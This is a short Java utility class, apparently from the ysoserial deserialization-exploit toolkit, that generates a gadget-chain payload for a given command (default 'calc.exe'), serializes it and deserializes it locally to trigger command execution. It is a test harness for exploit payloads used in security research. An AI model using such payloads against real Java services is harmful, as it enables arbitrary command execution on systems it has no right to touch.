package ysoserial.payloads.util;

import ysoserial.Serializer;
import ysoserial.payloads.ObjectPayload;
import ysoserial.secmgr.ExecCheckingSecurityManager;

import java.util.concurrent.Callable;

import static ysoserial.Deserializer.deserialize;

/*
 * utility class for running exploits locally from command line
 */
@SuppressWarnings("unused")
public class PayloadRunner {
	public static void run(final Class<? extends ObjectPayload<?>> clazz, final String[] args) throws Exception {
		// ensure payload generation doesn't throw an exception
		byte[] serialized = new ExecCheckingSecurityManager().wrap(new Callable<byte[]>(){
			public byte[] call() throws Exception {
				final String command = args.length > 0 && args[0] != null ? args[0] : "calc.exe";

				System.out.println("generating payload object(s) for command: '" + command + "'");

				final Object objBefore = clazz.newInstance().getObject(command);

				System.out.println("serializing payload");

				return Serializer.serialize(objBefore);
		}});

		System.out.println("deserializing payload");
		final Object objAfter = deserialize(serialized);
		objAfter.toString(); //Some payload needed some interaction(See Spring-AOP)

	}

}
